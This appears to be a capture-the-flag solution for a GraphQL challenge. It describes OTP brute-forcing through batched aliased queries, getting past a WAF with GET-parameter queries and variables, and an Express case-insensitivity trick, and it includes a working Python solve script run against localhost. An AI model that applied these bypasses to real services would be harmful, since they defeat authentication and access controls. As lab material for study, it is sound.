# Description

- Bypassing OTP using GraphQL's ability to send multiple queries in a single request.
- Bypassing WAF using the characteristics of a GraphQL server.
    - Bypassing the body size limit by sending GraphQL query in GET parameter(`query`).
    - Bypassing the "admin" string check with sending variables in the GET body.
- Bypassing WAF by exploiting the case-insensitive nature of Express.


# solve.py
```python
import requests

URL = "http://localhost:4000/graphql"
variables = {"d": "admin"}
template = 'a%num%: otp(u:$d,i:%num2%,otp:"%num%")'

for ii in range(40):
    print(ii)
    for start in range(0, 1000, 250):
        wow = [template.replace("%num%", str(i).zfill(3)).replace("%num2%", str(ii)) for i in range(start, start + 250)]
        query = """
        query Some($d: String!){
        %wow%
        }
        """.replace("%wow%", "\n".join(wow))
        result = requests.get(URL, params={"query": query}, json={"variables": variables})
        if "OK !!!" in result.text:
            print(result, result.text)
            break

print(requests.get("http://localhost:4000/Admin").text)
```
